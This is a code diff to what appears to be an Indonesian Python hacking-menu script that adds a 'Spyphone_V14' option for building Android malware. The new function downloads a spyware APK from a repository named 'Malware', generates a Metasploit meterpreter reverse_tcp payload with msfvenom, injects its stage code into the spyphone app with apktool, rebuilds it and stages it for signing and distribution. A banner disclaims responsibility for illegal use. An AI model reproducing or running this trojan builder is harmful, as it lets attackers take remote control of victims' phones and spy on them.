@@ -88,6 +88,21 @@ def payload():
 		print ' '
 	print hijau+'PLEASE WAIT ...'
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
+	
+def spyphone_V14():
+	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk -o Malware/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
+	os.system("cd Malware && rm -rf payload.apk payload spyphone")
+	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
+	os.system("rm -rf Malware/spyphone.apk")
+	payload()
+	os.system("cd Malware && apktool d payload.apk -o payload")
+	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
+	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit")
+	os.system("cd Malware && apktool b spyphone -o spyphone_V14.apk")
+	os.system("cd Malware && rm -rf payload.apk payload spyphone")
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')
+		
 
 	
 def spyphone():
@@ -107,29 +122,35 @@ def spyphone():
 	
 def awal():
 	malware()
-	pilmal()	
+	pilmal()
 	
+def pilmal():
+    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
+    if zedd == '':
+    	os.system('clear')
+        home()
+    else:
+        if zedd == '1':
+            spyphone()
+        else:
+            if zedd == '2':
+                spyphone_V14()
+            else:
+            	print '\x1b[1;91m[!] Pilih 1-2'
+            	os.system('clear')
+            	awal()
+            
+
 def malware():
     os.system('clear')
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
+    print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
     print '\r\x1b[1;91m__________________________________________«Back» '
     
-def pilmal():
-    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
-    if zedd == '':
-        time.sleep(1)
-        home()       
-    else:
-        if zedd == '1':
-            spyphone()
-        else:
-			print '\x1b[1;91m[!] Pilihan Salah'
-			os.system('clear')
-			rumah()
+        	
 
-      
 
 def logo():      
 	print "\n \x1b[1;92m \n \x1b[1;97m╔════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;91m                 PERINGATAN    \x1b[1;96m\x1b[1;97m                ║\n \x1b[1;97m║\x1b[1;91m    Kami Tidak Bertanggung Jawab Atas Segala   \x1b[  \x1b[1;97m ║\n \x1b[1;97m║\x1b[1;91m       Pelanggaran HUKUM Yang Anda lakukan   \x1b[  \x1b[1;97m   ║   \n \x1b[1;97m╚════════════════════════════════════════════════╝"  '\n'
